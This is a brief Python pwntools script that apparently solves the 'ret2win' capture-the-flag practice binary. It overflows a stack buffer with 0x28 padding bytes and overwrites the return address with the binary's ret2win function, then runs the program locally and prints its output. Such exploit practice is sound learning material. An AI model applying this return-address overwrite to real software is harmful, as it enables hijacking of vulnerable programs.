#!/usr/bin/env python3

from pwn import *
e = ELF("ret2win")

pl = asm("nop") * 0x28
pl += p64(e.symbols["ret2win"])

proc = process([e.path, e.path])
proc.send(pl)
print(proc.readall())
